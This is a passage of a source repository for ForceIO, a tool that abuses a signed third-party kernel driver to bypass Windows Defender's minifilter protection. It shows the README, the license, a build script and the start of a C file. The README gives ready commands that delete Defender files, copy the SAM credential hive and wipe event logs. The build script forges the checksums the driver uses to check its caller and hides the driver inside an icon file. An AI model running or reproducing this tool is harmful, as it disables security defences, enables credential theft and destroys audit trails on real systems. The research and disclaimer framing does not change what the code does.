@@ -1,0 +1,3282 @@
+Project Path: arc_wesmar_ForceIO_isyii23v
+
+Source Tree:
+
+```txt
+arc_wesmar_ForceIO_isyii23v
+├── ForceIO.slnx
+├── IcoBuilder
+│   └── forceio.dat
+├── LICENSE.md
+├── README.md
+├── build.ps1
+└── src
+    ├── Console.c
+    ├── Console.h
+    ├── DeviceIO.c
+    ├── DeviceIO.h
+    ├── DriverExtract.c
+    ├── DriverExtract.h
+    ├── DriverSession.c
+    ├── DriverSession.h
+    ├── ForceIO.manifest
+    ├── ForceIO.rc
+    ├── ForceIO.vcxproj
+    ├── ForceIO.vcxproj.filters
+    ├── HiveIO.c
+    ├── HiveIO.h
+    ├── PathSafety.h
+    ├── Resource.h
+    ├── Stager.c
+    ├── Stager.h
+    └── main.c
+
+```
+
+`ForceIO.slnx`:
+
+```slnx
+<Solution>
+  <Configurations>
+    <BuildType Name="Release" />
+    <Platform Name="x86" />
+  </Configurations>
+  <Project Path="src/ForceIO.vcxproj" />
+</Solution>
+
+```
+
+`LICENSE.md`:
+
+```md
+# MIT License
+
+## ForceIO — Minifilter-bypass file operations via signed kernel driver
+
+**Copyright (c) 2026 Marek Wesołowski (WESMAR)**
+
+---
+
+## License Grant
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software
+and associated documentation files (the "Software"), to deal in the Software without restriction,
+including without limitation the rights to use, copy, modify, merge, publish, distribute,
+sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+## Attribution Requirement
+
+The above copyright notice and this permission notice shall be included in all copies or
+substantial portions of the Software.
+
+## Disclaimer of Warranty
+
+**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
+INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
+PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE
+FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
+OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
+DEALINGS IN THE SOFTWARE.**
+
+---
+
+## Project Information
+
+- **Project:** ForceIO — Minifilter-bypass file operations via signed kernel driver
+- **Author:** Marek Wesołowski (WESMAR)
+- **Contact:** marek@wesolowski.eu.org
+- **Platform:** Windows 10/11 x64
+- **Language:** C (pure Win32 API, no CRT)
+
+---
+
+## Responsible Use
+
+This software is intended exclusively for authorized security research, educational purposes,
+and use on systems you own or have explicit written permission to test. Users must ensure
+their activities comply with applicable laws:
+
+- **Authorization required** — only use on systems you own or have explicit permission to modify.
+- **Local laws** — comply with computer fraud and abuse laws in your jurisdiction.
+- **No malicious use** — do not use for unauthorized access, data destruction, or security bypass on systems you do not control.
+
+The driver binary (`IObitUnlocker.sys`) is not distributed with this project. Users must
+obtain a legitimate copy from the IObit Unlocker freeware installer.
+
+---
+
+*Copyright (c) 2026 Marek Wesołowski (WESMAR). All rights reserved under MIT License terms.*
+
+```
+
+`README.md`:
+
+```md
+# ForceIO
+
+**Minifilter-bypass file operations via signed kernel driver — standalone tool for deleting, moving, and copying files protected by WdFilter.sys on Windows 11**
+
+> Uses the WHCP-signed `IObitUnlocker.sys` driver to route file I/O below the Filter Manager,
+> bypassing WdFilter.sys and other minifilter protections. No IObit DLL, no IObit EXE, no bloatware.
+
+---
+
+## What It Does
+
+ForceIO loads a signed kernel driver via an atomic SCM session and sends a single `DeviceIoControl` call to perform file operations that user-mode APIs cannot:
+
+```
+ForceIO.exe delete "C:\ProgramData\Microsoft\Windows Defender\Scans\DefenderEcsCache.bin64"
+[*] DELETE: C:\ProgramData\Microsoft\Windows Defender\Scans\DefenderEcsCache.bin64
+[+] Success.
+```
+
+`Remove-Item -Force` returns **Access denied** on the same path — WdFilter blocks the I/O request.
+ForceIO deletes it because the IOCTL routes below the minifilter stack.
+
+---
+
+## Usage
+
+Run from an **elevated command prompt** (Administrator):
+
+```
+ForceIO — minifilter-bypass file operations via signed driver
+© WESMAR Marek Wesołowski
+
+Usage: ForceIO <command> <path> [dest]
+
+Commands:
+  list    <path>       List visible directory entries (diagnostic)
+  locks   <path>       Show which processes lock the file (supports * and ?)
+  delete  <path>       Force-delete file or directory (supports * and ?, bypasses WdFilter)
+  rename  <src> <dst>  Force-rename/move file or directory
+  copy    <src> <dst>  Copy locked file (or snapshot mounted registry hive)
+  start                Load driver only
+  stop                 Unload driver
+  cleanup              Stop driver, remove service, delete temp files
+```
+
+### Examples
+
+```cmd
+:: Delete a WdFilter-protected file
+ForceIO.exe delete "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\Unknown.Log"
+
+:: Move a protected directory
+ForceIO.exe rename "C:\ProgramData\Microsoft\Windows Defender" "C:\ProgramData\Microsoft\Windows Defender_"
+
+:: Copy a locked file (or mounted registry hive)
+ForceIO.exe copy "C:\Windows\System32\config\SAM" "C:\Temp\SAM.copy"
+
+:: Show which processes lock a file
+ForceIO.exe locks "C:\Windows\System32\winevt\Logs\HardwareEvents.evtx"
+
+:: Batch delete locked/protected files using wildcards (* and ?) in a single driver session
+ForceIO.exe delete "C:\Windows\System32\winevt\Logs\*.evtx"
+ForceIO.exe delete "C:\Windows\System32\winevt\Logs\Hardware?????.evtx"
+
+:: Query locks across files matching wildcards (* and ?)
+ForceIO.exe locks "C:\Windows\System32\winevt\Logs\*.evtx"
+ForceIO.exe locks "C:\Windows\System32\winevt\Logs\Hardware?????.evtx"
+
+:: Relative paths work from any working directory (e.g. when ForceIO is in System32 / PATH)
+cd C:\Windows\System32\winevt\Logs
+ForceIO.exe delete *.evtx
+ForceIO.exe delete Hardware?????.evtx
+ForceIO.exe locks *.evtx
+```
+
+---
+
+## How It Works
+
+1. **FDI decompression** — the signed driver binary is LZX-compressed into a CAB archive appended to the application icon. At runtime, FDI decompresses it in memory and writes `forceio.dat` to `%SystemRoot%`.
+
+2. **Atomic driver session** — `CreateServiceW` → `StartServiceW` → `DeviceIoControl` → `ControlService(STOP)` → `DeleteService` → `DeleteFileW`. The service exists in the registry only for the duration of the IOCTL. Zero `Sleep` calls.
+
+3. **Direct IOCTL** — constructs a 0x428-byte `METHOD_BUFFERED` buffer with source path, destination path, operation type, and flags, then calls `DeviceIoControl(0x222124)` for file operations or `0x222128` for lock queries.
+
+4. **Dynamic in-flight mathematical stager** — the driver enforces caller validation by reading the calling process's EXE directly from disk (`ZwCreateFile` → `ZwReadFile`) and requiring two checksums: `XOR == 0x2B` and `ALT == 0x00A88677`. Reaching this modular sum requires a minimum mathematical file size (~158 KB). Rather than carrying ~87 KB of dead-weight static overlay on disk, the distributed `ForceIO.exe` is an ultra-slim ~72 KB binary. At runtime, it dynamically calculates the arithmetic modular correction, synthesizes the padded worker in `%TEMP%\fio_wk_<PID>_<Tick>.exe`, executes the worker with inherited stdio, and unlinks it immediately upon completion. If executed on an already padded binary (e.g., compiled with `-StandalonePatch`), it detects valid checksums and executes directly without spawning.
+
+5. **WOW64 redirection bypass** — disables WOW64 file system redirection on 64-bit systems at startup (`Wow64DisableWow64FsRedirection`), enabling native access to `System32` directories (such as `System32\winevt\Logs\`) without redirection to `SysWOW64`.
+
+6. **CWD path canonicalization** — automatically expands relative paths (`GetFullPathNameW`) so commands work from any working directory, passing fully qualified `\??\C:\...` paths to the kernel driver.
+
+7. **Batch wildcard operations** — when deleting or querying locks using wildcards (`*` and `?`), the driver is loaded once, all matching files are processed within that single atomic session, and the driver is unloaded cleanly at the end.
+
+---
+
+## Technical Details
+
+| Item | Value |
+|------|-------|
+| Driver | `IObitUnlocker.sys` v1.3.0.20 (x64, WHCP-signed by Microsoft) |
+| Device | `\\.\IObitUnlockerDevice` |
+| IOCTL | `0x222124` (file ops), `0x222128` (handle query) |
+| Buffer | 0x428 bytes: `SourcePath[264 WCHAR]` + `DestPath[264 WCHAR]` + `OpType` + `Flags` |
+| Operations | 1=delete, 2=raw rename, 3=move/cut, 4=copy |
+| Checksum targets | XOR=`0x2B`, ALT=`0x00A88677` (hardcoded at driver+0x3DC7) |
+| Stager mechanism | Dynamic in-flight mathematical padding synthesis (`%TEMP%\fio_wk_*.exe`) |
+| Binary size | ~72 KB standalone executable (includes compressed 64-bit kernel driver) |
+| Compilation | `/NODEFAULTLIB`, `/ENTRY:Entry`, `/GS-`, `/W4`, `/WX` — pure Win32 API |
+| Imports | `kernel32.dll`, `advapi32.dll`, `cabinet.dll` |
+| Architecture | PE32 (x86) — IOCTL is bitness-transparent via `METHOD_BUFFERED` |
+| Technique | BYOPD — Bring Your Own Overpowered Driver: signed, legitimate primitives, weak caller validation |
+
+### Why not patch the driver instead?
+
+Patching 4 bytes in the driver (two `jne` → `NOP NOP` at `+0x3DCC` and `+0x3DD6`) would disable caller validation entirely. However, this invalidates the WHCP Authenticode signature and the driver will not load under Driver Signature Enforcement (the default on all supported Windows configurations).
+
+While the driver mathematically requires a minimum on-disk file size (~158 KB) to satisfy the alternating sum `ALT == 0x00A88677`, this constraint applies to the *calling image file on disk* when `ZwCreateFile` is executed by ring 0, not to the distributed executable itself. ForceIO decouples this constraint via runtime stager synthesis: the distributed binary remains an ultra-slim ~72 KB, while the ephemeral worker satisfying ring 0 exists on disk only for the millisecond duration of the IOCTL.
+
+---
+
+## Building from Source
+
+Requires **Visual Studio 2026 Enterprise** (MSVC v145, Windows SDK 10.0):
+
+```powershell
+cd C:\Projekty\ForceIO
+.\build.ps1
+```
+
+The build script:
+1. LZX-compresses the driver via `makecab` into a CAB archive.
+2. Appends the CAB to the application icon (`IcoBuilder\kvc.ico` → `ICON\kvc.ico`).
+3. Generates `src\GenIconSize.h` with the icon header byte count (FDI seek offset).
+4. Builds `src\ForceIO.vcxproj` as `Release|Win32` via MSBuild.
+5. Verifies no CRT dependencies (`kernel32.dll`, `advapi32.dll`, `cabinet.dll` only).
+6. Outputs clean, unpadded ~72 KB binary with dynamic in-flight stager (or pass `-StandalonePatch` for pre-padded 158 KB binary).
+7. Sets deterministic timestamps.
+
+Output: `bin\ForceIO.exe` (~72 KB)
+
+### Project layout
+
+```
+ForceIO/
+├── IcoBuilder/
+│   ├── kvc.ico              Base application icon
+│   └── forceio.dat          Signed driver binary (user-supplied)
+├── ICON/
+│   └── kvc.ico              Combined icon + LZX-CAB payload (built)
+├── src/
+│   ├── main.c               Entry point, CLI dispatch
+│   ├── Stager.c/.h          Dynamic in-flight mathematical stager & worker spawner
+│   ├── DeviceIO.c/.h        IOCTL protocol, buffer construction
+│   ├── HiveIO.c/.h          Registry hive copy via RegSaveKeyExW (bypasses kernel hive lock)
+│   ├── DriverSession.c/.h   Atomic SCM lifecycle (Begin/End)
+│   ├── DriverExtract.c/.h   FDI in-memory decompression
+│   ├── Console.c/.h         No-CRT console output
+│   ├── PathSafety.h         Path canonicalization and WOW64 bypass
+│   ├── GenIconSize.h        Auto-generated icon header size
+│   ├── Resource.h           Resource identifiers
+│   ├── ForceIO.rc           Icon + RCDATA resource
+│   ├── ForceIO.manifest     UAC elevation manifest
+│   └── ForceIO.vcxproj      Visual Studio project (Win32 Release)
+├── build.ps1                Full build pipeline + checksum patch
+└── bin/
+    └── ForceIO.exe          Final standalone binary
+```
+
+### Driver binary
+
+The driver binary (`IObitUnlocker.sys`) is **not included** in this repository. To build ForceIO, place a legally obtained copy of `IObitUnlocker.sys` v1.3.0.20 as `IcoBuilder\forceio.dat`. The driver is available in the [IObit Unlocker](https://www.iobit.com/en/iobit-unlocker.php) freeware installer.
+
+---
+
+## Requirements
+
+- **OS:** Windows 10/11 x64 (tested on Windows 11 Pro **26H2** build 10.0.26300 and **26H1** build 10.0.28000, fully patched)
+- **Privileges:** Administrator (SCM service creation requires elevation)
+- **DSE:** Enabled (driver is genuinely WHCP-signed)
+- **HVCI:** Compatible (driver loads normally under Hypervisor Code Integrity)
+
+---
+
+## Full Writeup
+
+The complete reverse engineering writeup — including IDA static analysis, CDB live disassembly, 56-function IAT reconstruction, four failed bypass attempts, the mathematical proof of irreducible padding, detailed driver architecture, and a discussion of why **BYOPD** (Bring Your Own Overpowered Driver) is a more precise classification than BYOVD for drivers that expose overpowered primitives without memory-safety exploits — is published at:
+
+**https://kvc.pl/research/forceio-minifilter-bypass**
+
+---
+
+## Disclaimer
+
+This software is provided for **authorized security research and educational purposes only** on systems you own or have explicit written permission to test. The author is not responsible for any damage or misuse. Always comply with applicable laws in your jurisdiction.
+
+---
+
+## License
+
+MIT — see [LICENSE.md](LICENSE.md)
+
+**Author:** Marek Wesołowski (WESMAR)
+**Contact:** marek@wesolowski.eu.org
+**GitHub:** https://github.com/wesmar/ForceIO
+
+```
+
+`build.ps1`:
+
+```ps1
+# ForceIO - deterministic Release x86 build + driver checksum patching
+# WESMAR Marek Wesolowski
+
+[CmdletBinding()]
+param(
+    [switch]$Clean,
+    [switch]$NoBuild,
+    [switch]$StandalonePatch
+)
+
+Set-StrictMode -Version Latest
+$ErrorActionPreference = "Stop"
+
+$ProjectRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
+$ProjectFile = Join-Path $ProjectRoot "src\ForceIO.vcxproj"
+$OutputDir   = Join-Path $ProjectRoot "bin"
+$OutputExe   = Join-Path $OutputDir "ForceIO.exe"
+
+# Driver checksum targets (from IObitUnlocker.sys+0x3DC7)
+$TARGET_XOR = 0x2B
+$TARGET_ALT = 0x00A88677
+
+$IcoBuilder  = Join-Path $ProjectRoot 'IcoBuilder'
+$IconDir     = Join-Path $ProjectRoot 'ICON'
+
+$TransientDirs = @(
+    (Join-Path $ProjectRoot ".vs"),
+    (Join-Path $ProjectRoot "obj"),
+    (Join-Path $ProjectRoot "x64"),
+    (Join-Path $ProjectRoot "Win32"),
+    (Join-Path $ProjectRoot "src\.vs"),
+    (Join-Path $ProjectRoot "src\obj"),
+    (Join-Path $ProjectRoot "src\x64"),
+    (Join-Path $ProjectRoot "src\Win32")
+)
+
+function Build-PayloadIcon {
+    $baseIcon  = Join-Path $IcoBuilder 'kvc.ico'
+    $driverDat = Join-Path $IcoBuilder 'forceio.dat'
+    $outIcon   = Join-Path $IconDir 'kvc.ico'
+
+    foreach ($f in $baseIcon, $driverDat) {
+        if (-not (Test-Path -LiteralPath $f)) {
+            throw "Required file not found: $f"
+        }
+    }
+
+    $iconBytes  = [System.IO.File]::ReadAllBytes($baseIcon)
+    $headerSize = $iconBytes.Length
+
+    $tmpDir = [System.IO.Path]::Combine(
+        [System.IO.Path]::GetTempPath(),
+        "fio_pack_$([System.IO.Path]::GetRandomFileName())")
+    New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
+
+    try {
+        $tmpDat = Join-Path $tmpDir 'forceio.dat'
+        Copy-Item -LiteralPath $driverDat -Destination $tmpDat -Force
+
+        $ddf = @"
+.Set CabinetNameTemplate=forceio.cab
+.Set DiskDirectoryTemplate=$tmpDir
+.Set CompressionType=LZX
+.Set CompressionMemory=21
+.Set MaxCabinetSize=0
+.Set Cabinet=on
+.Set Compress=on
+"$tmpDat" forceio.dat
+"@
+        $ddfPath = Join-Path $tmpDir 'pack.ddf'
+        [System.IO.File]::WriteAllText($ddfPath, $ddf, [System.Text.Encoding]::ASCII)
+
+        $p = Start-Process makecab.exe `
+                 -ArgumentList '/F', "`"$ddfPath`"" `
+                 -Wait -PassThru -NoNewWindow -WorkingDirectory $tmpDir
+        if ($p.ExitCode -ne 0) {
+            throw "makecab.exe failed (exit $($p.ExitCode))"
+        }
+
+        $cabPath = Join-Path $tmpDir 'forceio.cab'
+        if (-not (Test-Path -LiteralPath $cabPath)) {
+            throw "CAB not produced: $cabPath"
+        }
+
+        $cabBytes = [System.IO.File]::ReadAllBytes($cabPath)
+        $combined = [byte[]]::new($headerSize + $cabBytes.Length)
+        [Array]::Copy($iconBytes, 0, $combined, 0, $headerSize)
+        [Array]::Copy($cabBytes, 0, $combined, $headerSize, $cabBytes.Length)
+
+        if (-not (Test-Path -LiteralPath $IconDir)) {
+            New-Item -ItemType Directory -Force -Path $IconDir | Out-Null
+        }
+        [System.IO.File]::WriteAllBytes($outIcon, $combined)
+
+        Write-Host ("  Driver : {0:N0} B -> {1:N0} B CAB" -f (Get-Item $driverDat).Length, $cabBytes.Length) -ForegroundColor DarkGray
+        Write-Host ("  Icon   : {0:N0} B header + {1:N0} B CAB = {2:N0} B total" -f $headerSize, $cabBytes.Length, $combined.Length) -ForegroundColor DarkGray
+
+        $genH = @"
+// Auto-generated by build.ps1 — do not edit manually.
+// Byte count of IcoBuilder\kvc.ico; CAB payload begins at this offset.
+#pragma once
+#define ICON_HEADER_SIZE $headerSize
+"@
+        [System.IO.File]::WriteAllText((Join-Path $ProjectRoot 'src\GenIconSize.h'), $genH)
+        Write-Host "  GenIconSize.h : ICON_HEADER_SIZE = $headerSize" -ForegroundColor DarkGray
+    }
+    finally {
+        Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function Resolve-MSBuild {
+    # 1. Official Microsoft locator tool: vswhere (queries newest instance)
+    $vswhereCandidates = @(
+        (Join-Path ${env:ProgramFiles(x86)} "Microsoft Visual Studio\Installer\vswhere.exe"),
+        (Join-Path $env:ProgramFiles "Microsoft Visual Studio\Installer\vswhere.exe")
+    )
+    $vswhereCmd = Get-Command vswhere.exe -ErrorAction SilentlyContinue
+    if ($vswhereCmd) {
+        $vswhereCandidates += $vswhereCmd.Source
+    }
+
+    $vswhere = $vswhereCandidates | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -First 1
+    if ($vswhere) {
+        $installationPath = & $vswhere -latest -prerelease -products * -requires Microsoft.Component.MSBuild -property installationPath
+        if ($LASTEXITCODE -eq 0 -and $installationPath) {
+            $candidates = @(
+                (Join-Path $installationPath "MSBuild\Current\Bin\MSBuild.exe"),
+                (Join-Path $installationPath "MSBuild\Current\Bin\amd64\MSBuild.exe"),
+                (Join-Path $installationPath "MSBuild\15.0\Bin\MSBuild.exe")
+            )
+            foreach ($candidate in $candidates) {
+                if (Test-Path -LiteralPath $candidate) {
+                    return $candidate
+                }
+            }
+        }
+
+        # Secondary search using vswhere -find
+        $foundPaths = & $vswhere -latest -prerelease -products * -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe
+        if ($LASTEXITCODE -eq 0 -and $foundPaths) {
+            $first = ($foundPaths -split "\r?\n" | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -First 1)
+            if ($first) {
+                return $first
+            }
+        }
+    }
+
+    # 2. Filesystem search across standard Program Files roots, sorted descending by version
+    $searchRoots = @(
+        $env:ProgramFiles,
+        ${env:ProgramFiles(x86)}
+    ) | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique
+
+    $discoveredVsDirs = @()
+    foreach ($root in $searchRoots) {
+        $vsRoot = Join-Path $root "Microsoft Visual Studio"
+        if (Test-Path -LiteralPath $vsRoot) {
+            $discoveredVsDirs += Get-ChildItem -LiteralPath $vsRoot -Directory -ErrorAction SilentlyContinue
+        }
+    }
+
+    # Sort descending so newest Visual Studio version (e.g. 18, 17...) is evaluated first
+    $sortedVsDirs = $discoveredVsDirs | Sort-Object {
+        $cleanNum = ($_.Name -replace '[^\d.]', '')
+        if ($cleanNum) { [version]$cleanNum } else { [version]'0.0' }
+    } -Descending
+
+    $editions = @("Enterprise", "Professional", "Community", "BuildTools", "Preview")
+    foreach ($dir in $sortedVsDirs) {
+        foreach ($edition in $editions) {
+            $candidates = @(
+                (Join-Path $dir.FullName "$edition\MSBuild\Current\Bin\MSBuild.exe"),
+                (Join-Path $dir.FullName "$edition\MSBuild\Current\Bin\amd64\MSBuild.exe"),
+                (Join-Path $dir.FullName "$edition\MSBuild\15.0\Bin\MSBuild.exe")
+            )
+            foreach ($candidate in $candidates) {
+                if (Test-Path -LiteralPath $candidate) {
+                    return $candidate
+                }
+            }
+        }
+    }
+
+    # 3. Environment PATH fallback
+    $pathCmd = Get-Command msbuild.exe -ErrorAction SilentlyContinue
+    if ($pathCmd) {
+        return $pathCmd.Source
+    }
+
+    throw "MSBuild not found. Install Visual Studio or Build Tools with Desktop C++ workload."
+}
+
+function Remove-TransientDirs {
+    foreach ($dir in $TransientDirs) {
+        if (Test-Path -LiteralPath $dir) {
+            Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+function Assert-CleanLayout {
+    foreach ($dir in $TransientDirs) {
+        if (Test-Path -LiteralPath $dir) {
+            throw "Transient directory still present: $dir"
+        }
+    }
+    $remainingObj = @(Get-ChildItem -LiteralPath $ProjectRoot -Recurse -Filter "*.obj" -File -ErrorAction SilentlyContinue)
+    if ($remainingObj.Length -gt 0) {
+        throw ("Transient obj files still present: " + (($remainingObj | Select-Object -ExpandProperty FullName) -join ", "))
+    }
+}
+
+function Assert-ProjectExists {
+    if (-not (Test-Path -LiteralPath $ProjectFile)) {
+        throw "Project file not found: $ProjectFile"
+    }
+}
+
+function Invoke-Build {
+    param([string]$MSBuildPath)
+
+    if (-not (Test-Path $OutputDir)) {
+        New-Item -ItemType Directory -Path $OutputDir | Out-Null
+    }
+
+    $arguments = @(
+        $ProjectFile
+        "/t:Build"
+        "/p:Configuration=Release;Platform=Win32"
+        "/m"
+        "/nr:false"
+        "/v:minimal"
+    )
+
+    Write-Host "[*] Building ForceIO (Release x86)..." -ForegroundColor Cyan
+    & $MSBuildPath @arguments
+    if ($LASTEXITCODE -ne 0) {
+        throw "MSBuild failed with exit code $LASTEXITCODE."
+    }
+
+    if (-not (Test-Path $OutputExe)) {
+        throw "Build completed but output was not produced: $OutputExe"
+    }
+}
+
+function Get-Checksums {
+    param([byte[]]$Data)
+
+    [int]$xor = 0
+    [long]$alt = 0
+
+    for ($i = 0; $i -lt $Data.Length; $i++) {
+        $xor = $xor -bxor $Data[$i]
+        if ($i % 2 -eq 0) { $alt += $Data[$i] }
+        else               { $alt -= $Data[$i] }
+    }
+
+    # Handle negative ALT values - mask to unsigned 32-bit
+    $altMasked = $alt -band 0xFFFFFFFFL
+    if ($altMasked -lt 0) { $altMasked += 4294967296 }
+
+    return @{
+        XOR = $xor -band 0xFF
+        ALT = [long]$altMasked
+    }
+}
+
+function Invoke-ChecksumPatch {
+    Write-Host "[*] Patching binary checksums..." -ForegroundColor Cyan
+
+    $data = [System.IO.File]::ReadAllBytes($OutputExe)
+
+    if ($data.Length % 2 -ne 0) {
+        $data += [byte]0
+    }
+
+    $cs = Get-Checksums -Data $data
+    Write-Host ("  Current:  XOR=0x{0:X2}  ALT=0x{1:X8}" -f $cs.XOR, $cs.ALT) -ForegroundColor DarkGray
+    Write-Host ("  Target:   XOR=0x{0:X2}  ALT=0x{1:X8}" -f $TARGET_XOR, $TARGET_ALT) -ForegroundColor DarkGray
+
+    if ($cs.XOR -eq $TARGET_XOR -and $cs.ALT -eq $TARGET_ALT) {
+        Write-Host "[+] Checksums already match." -ForegroundColor Green
+        return
+    }
+
+    # Unsigned modular difference: how much to ADD to reach target (mod 2^32)
+    [long]$alt_need = ([long]$TARGET_ALT - [long]$cs.ALT + 4294967296) % 4294967296
+    [int]$bulk = [Math]::Floor($alt_need / 255)
+    [int]$remain = [int]($alt_need - [long]$bulk * 255)
+
+    [int]$xor_after = $cs.XOR
+    if ($bulk % 2 -ne 0) { $xor_after = $xor_after -bxor 0xFF }
+    [int]$xor_need = $xor_after -bxor $TARGET_XOR
+
+    Write-Host "  Bulk pairs: $bulk, remainder: $remain, XOR fix: 0x$($xor_need.ToString('X2'))" -ForegroundColor DarkGray
+
+    $solution = $null
+    for ($b0 = 0; $b0 -lt 256 -and -not $solution; $b0++) {
+        for ($b2 = 0; $b2 -lt 256 -and -not $solution; $b2++) {
+            $odd_sum = $b0 + $b2 - $remain
+            $odd_xor = $b0 -bxor $b2 -bxor $xor_need
+            if ($odd_sum -lt 0 -or $odd_sum -gt 510) { continue }
+            $diff = $odd_sum - $odd_xor
+            if ($diff -lt 0 -or $diff % 2 -ne 0) { continue }
+            for ($b1 = 0; $b1 -lt 256; $b1++) {
+                $b3 = $odd_sum - $b1
+                if ($b3 -ge 0 -and $b3 -le 255 -and (($b1 -bxor $b3) -eq $odd_xor)) {
+                    $solution = @($b0, $b1, $b2, $b3)
+                    break
+                }
+            }
+        }
+    }
+
+    if (-not $solution) {
+        throw "Cannot find checksum correction bytes."
+    }
+
+    Write-Host ("  Correction: [{0}]" -f ($solution -join ', ')) -ForegroundColor DarkGray
+
+    $padding = New-Object byte[] ($bulk * 2)
+    for ($i = 0; $i -lt $bulk; $i++) {
+        $padding[$i * 2]     = 0xFF
+        $padding[$i * 2 + 1] = 0x00
+    }
+    $tail = [byte[]]$solution
+
+    $patched = New-Object byte[] ($data.Length + $padding.Length + $tail.Length)
+    [Array]::Copy($data, 0, $patched, 0, $data.Length)
+    [Array]::Copy($padding, 0, $patched, $data.Length, $padding.Length)
+    [Array]::Copy($tail, 0, $patched, $data.Length + $padding.Length, $tail.Length)
+
+    $vcs = Get-Checksums -Data $patched
+    if ($vcs.XOR -ne $TARGET_XOR -or $vcs.ALT -ne $TARGET_ALT) {
+        throw ("Verification failed: XOR=0x{0:X2} ALT=0x{1:X8}" -f $vcs.XOR, $vcs.ALT)
+    }
+
+    [System.IO.File]::WriteAllBytes($OutputExe, $patched)
+    $appended = $patched.Length - $data.Length
+    Write-Host ("[+] Patched: {0:N0} bytes (+{1:N0} checksum correction)" -f $patched.Length, $appended) -ForegroundColor Green
+}
+
+try {
+    Assert-ProjectExists
+    $msbuild = Resolve-MSBuild
+    Write-Host "[*] Using MSBuild: $msbuild" -ForegroundColor Cyan
+
+    Remove-TransientDirs
+    Assert-CleanLayout
+
+    if ($Clean -or $NoBuild) {
+        if ($Clean -and (Test-Path -LiteralPath $OutputExe)) {
+            Remove-Item -LiteralPath $OutputExe -Force -ErrorAction SilentlyContinue
+            Write-Host "  [-] Removed output: $OutputExe" -ForegroundColor DarkGray
+        }
+        Write-Host "[+] Clean completed." -ForegroundColor Green
+        exit 0
+    }
+
+    Write-Host "[*] Packing driver into icon..." -ForegroundColor Cyan
+    Build-PayloadIcon
+
+    Invoke-Build -MSBuildPath $msbuild
+
+    # Purge obj and transient build outputs immediately after compilation
+    Remove-TransientDirs
+    Assert-CleanLayout
+
+    # Verify no CRT dependencies - pure kernel32/advapi32/cabinet only
+    Write-Host "[*] Verifying dependencies..." -ForegroundColor Cyan
+    $vsRoot = Split-Path (Split-Path (Split-Path (Split-Path $msbuild)))
+    $dumpbin = Get-ChildItem "$vsRoot\VC\Tools\MSVC\*\bin\Hostx64\x86\dumpbin.exe" -ErrorAction SilentlyContinue |
+               Sort-Object FullName -Descending | Select-Object -First 1
+    if (-not $dumpbin) {
+        $dumpbin = Get-ChildItem "$vsRoot\VC\Tools\MSVC\*\bin\Hostx86\x86\dumpbin.exe" -ErrorAction SilentlyContinue |
+                   Sort-Object FullName -Descending | Select-Object -First 1
+    }
+    if ($dumpbin) {
+        $deps = & $dumpbin.FullName /NOLOGO /DEPENDENTS $OutputExe 2>&1 | Out-String
+        if ($LASTEXITCODE -ne 0) { throw "dumpbin.exe failed: $LASTEXITCODE" }
+        $allowed = @("KERNEL32.dll", "ADVAPI32.dll", "CABINET.dll")
+        $dllLines = ($deps -split "`n") | Where-Object { $_ -match '^\s+\S+\.dll\s*$' } | ForEach-Object { $_.Trim() }
+        if (!$dllLines) { throw 'Dependency verification did not return any DLL names.' }
+        $forbidden = $dllLines | Where-Object { $_ -notin $allowed }
+        if ($forbidden) {
+            throw "Forbidden CRT dependencies detected: $($forbidden -join ', ')"
+        }
+        Write-Host ("  Dependencies: {0}" -f ($dllLines -join ', ')) -ForegroundColor DarkGray
+        Write-Host "[+] No CRT - clean." -ForegroundColor Green
+    } else {
+        Write-Host "  [!] dumpbin not found, skipping dependency check." -ForegroundColor Yellow
+    }
+
+    if ($StandalonePatch) {
+        Invoke-ChecksumPatch
+    } else {
+        Write-Host "[+] Dynamic in-flight stager enabled (unpadded slim binary)." -ForegroundColor Green
+    }
+
+    # Final cleanup of obj
+    Remove-TransientDirs
+    Assert-CleanLayout
+
+    $ts = Get-Date "2030-01-01 00:00:00"
+    $f = Get-Item $OutputExe
+    $f.CreationTime = $ts
+    $f.LastWriteTime = $ts
+
+    Write-Host "`n[+] Build complete: $OutputExe" -ForegroundColor Green
+    Write-Host ("[+] Final size: {0:N0} bytes" -f (Get-Item $OutputExe).Length) -ForegroundColor Green
+    exit 0
+}
+catch {
+    Write-Host "[!] $_" -ForegroundColor Red
+    exit 1
+}
+finally {
+    if (-not $NoBuild -and -not $Clean) {
+        Remove-TransientDirs
+        try {
+            Assert-CleanLayout
+        } catch {
+            Write-Warning "Clean layout check warning: $_"
+        }
+    }
+}
+
+```
+
+`src/Console.c`:
+
+```c
+// Console.c
+// No-CRT console output via WriteFile + WideCharToMultiByte.
+// © WESMAR Marek Wesołowski
+
+#include "Console.h"
+
+static HANDLE hOut;
+static HANDLE hErr;
+
+static int wlen(const wchar_t* s) {
+    const wchar_t* p = s;
+    while (*p) p++;
+    return (int)(p - s);
+}
+
+static void emit(HANDLE h, const wchar_t* msg) {
+    DWORD written;
+    int len = wlen(msg);
+    // Keep buffer under 4KB to avoid __chkstk
+    char buf[1024];
+    while (len > 0) {
+        // Each UTF-16 code unit needs at most three UTF-8 bytes.
+        int chunk = (len > 300) ? 300 : len;
+        // Keep a surrogate pair in the same conversion call.
+        if (chunk < len && msg[chunk - 1] >= 0xD800 && msg[chunk - 1] <= 0xDBFF)
+            chunk--;
